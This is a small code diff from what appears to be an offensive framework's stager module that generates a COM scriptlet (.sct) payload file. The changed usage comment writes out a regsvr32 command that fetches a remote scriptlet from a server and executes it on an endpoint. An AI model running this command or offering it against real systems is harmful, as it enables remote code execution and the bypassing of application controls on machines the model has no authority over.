@@ -12,7 +12,7 @@ class Stager:
             'Description': ('Generates an sct file (COM Scriptlet) Host this anywhere'),
 
             'Comments': [
-                'On the endpoint simply launch regsvr32 /u /n /s /i:http://127.0.0.1/file.sct scrobj.dll '
+                'On the endpoint simply launch regsvr32 /u /n /s /i:http://server/file.sct scrobj.dll '
             ]
         }
 
